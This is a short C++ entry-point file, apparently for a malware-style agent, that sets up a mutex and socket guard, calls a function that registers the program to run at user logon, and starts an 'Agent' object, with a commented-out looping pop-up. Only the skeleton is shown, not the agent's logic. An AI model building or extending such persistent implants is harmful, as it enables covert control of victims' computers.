#include "SocketGuard.h"

#include <iostream>

#include "Agent.h"
#include "PopUp.h"
#include "Presistence.h"
#include "Resilience.h"
#include "Mutex.h"

int main(int argc, char* argv[]) {
    SocketGuard socketGuard;
    RunGuard runGuard;

    CurrentProcRegistryLogon();

    //PopUp("Yo yo", POPUP_LOOP_CAPTION);

    Agent agent;
    agent.start();

    return 0;
}
